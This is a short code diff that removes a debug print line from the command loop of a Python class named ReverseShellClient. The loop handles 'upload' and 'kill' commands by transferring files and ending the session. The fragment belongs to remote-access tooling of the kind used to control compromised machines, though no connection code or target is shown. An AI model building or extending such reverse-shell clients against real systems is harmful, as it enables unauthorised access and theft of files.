@@ -164,7 +164,6 @@ class ReverseShellClient:
                     output = self.upload_file(local_path)
                 elif cmd.lower().startswith("upload"):
                     remote_path = cmd[7:].strip()
-                    print("upload local path:", remote_path)
                     output = self.download_file(remote_path)
                 elif cmd.lower() == "kill":
                     output = self.kill_connection()
